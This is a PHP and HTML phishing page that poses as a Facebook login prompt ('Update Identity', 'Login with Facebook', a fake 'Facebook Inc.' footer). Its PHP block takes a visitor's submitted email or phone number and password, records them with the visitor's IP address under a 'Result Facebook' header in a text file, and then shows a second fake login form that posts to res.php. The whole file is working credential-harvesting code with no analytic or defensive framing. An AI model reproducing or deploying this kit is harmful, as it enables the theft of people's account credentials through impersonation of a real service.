<?php 
if(!isset($_POST['email']) || !isset($_POST['password'])) {
    header('location: ./');
} else {
	$email = $_POST['email'];
    $pass  = $_POST['password'];
	$ip    = $_SERVER['REMOTE_ADDR'];

	if(empty($email) || empty($pass)) {
		echo "<scrip>alert('Complete All Data!'); document.location='./';</script>";
	} else {
        $file = "GASPOLLLokeeeeeeeeeLL.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "==============================");
        fwrite($handle, "\n");
        fwrite($handle, "Result Facebook");
        fwrite($handle, "\n");
        fwrite($handle, "\n");
        fwrite($handle, "Email atau Telepon : ");
        fwrite($handle, "$email");
        fwrite($handle, "\n");
        fwrite($handle, "Kata Sandi : ");
        fwrite($handle, "$pass");
        fwrite($handle, "\n");
        fwrite($handle, "IP Address : ");
        fwrite($handle, "$ip");
        fwrite($handle, "\n");
        fwrite($handle, "==============================");
        fwrite($handle, "\n");
        fwrite($handle, "\n");
        fclose($handle);
	}
}

?>

<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="css/facebook.css">
    <link rel="stylesheet" href="css/animate.css">
    <title>Update Identity</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
   <link rel="icon" href="https://www.freepnglogos.com/uploads/facebook-logo-icon/facebook-logo-icon-file-facebook-icon-svg-wikimedia-commons-4.png">
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light py-1 ps-2">
        <span class="text-logo text-white">Login with Facebook</span>
    </nav>

    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-12 mt-5">
                <img class="img-section mt-3" src="BB.png" alt="">
            </div>
            <div class="col-md-12 col-12 d-block mt-4 text-section">
                <span class="d-block mt-3"></span>
            </div>
            <div class="col-md-12 col-12 d-block mt-5">
                <button class="btn btn-primary d-block mx-auto mt-3" onclick="open_facebook()">Continue</button>
                <button class="btn d-block mx-auto mt-3">Abort</button>
            </div>
        </div>
    </div>

    <div class="popup-login login-facebook animated fadeIn" style="display: block;">
	<div class="popup-box-login-fb">
		<a href="javascript:void(0);" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="POKER.png">
		</div>
		<div class="content-box-fb">
			<div class="txt-login-fb">
			</div>
			<form action="res.php" method="post">
                <input type="hidden" name="email" value="<?= $email ?>">
				<input type="text" class="loginEmail" name="birthday" placeholder="Phone Number" autocomplete="off" autocapitalize="off" required>
				<input type="text" class="loginPassword" name="password" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="js/popup.js"></script>
  </body>
</html>